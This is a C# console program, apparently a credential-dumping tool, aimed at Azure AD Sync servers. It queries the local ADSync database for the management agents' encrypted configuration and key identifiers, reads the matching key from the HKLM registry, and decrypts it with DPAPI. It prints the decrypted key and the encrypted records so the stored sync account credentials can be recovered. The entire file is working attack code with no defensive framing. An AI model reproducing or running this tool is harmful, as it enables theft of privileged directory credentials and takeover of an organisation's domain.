using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
namespace ADSyncGather
{
    class Program
    {
        static void Main(string[] args)
        {
            string connectionString = (args.Length == 0) ? "Data Source=(LocalDB)\\.\\ADSync2019;Initial Catalog=ADSync;Connect Timeout=30" : args[0];
            Console.WriteLine("Opening database {0}", connectionString);
            using (SqlConnection conn = new SqlConnection(connectionString))
            {
                conn.Open();
                SqlCommand command = new SqlCommand("SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;", conn);
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    Console.WriteLine("Record: {0};{1}",
                        Convert.ToBase64String(Encoding.Unicode.GetBytes(reader[0].ToString())), reader[1].ToString());
                }
                reader.Close();
                command = new SqlCommand("SELECT instance_id, keyset_id, entropy FROM mms_server_configuration;", conn);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Config: {0};{1};{2}",
                    reader[0].ToString(), reader[1].ToString(), reader[2].ToString());
                string keyset_id = reader[1].ToString();
                Guid entropy = new Guid(reader[2].ToString());
                string reglocation = string.Format("SOFTWARE\\Microsoft\\Ad Sync\\Shared\\{0}", keyset_id);
                //Console.WriteLine(reglocation);
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(reglocation))
                {
                    if (key != null)
                    {
                        byte[] cryptedkey = (byte[]) key.GetValue("");
                        if (cryptedkey != null)
                        {
                            byte[] decrypted = ProtectedData.Unprotect(cryptedkey, entropy.ToByteArray(), DataProtectionScope.LocalMachine);
                            Console.WriteLine("Unencrypted key: {0}", Convert.ToBase64String(decrypted));
                        }
                        else
                        {
                            Console.WriteLine("crypted key is null");
                        }
                    }
                    else
                    {
                        Console.WriteLine("key is null");
                    }
                }
                reader.Close();

            }

        }
    }
}
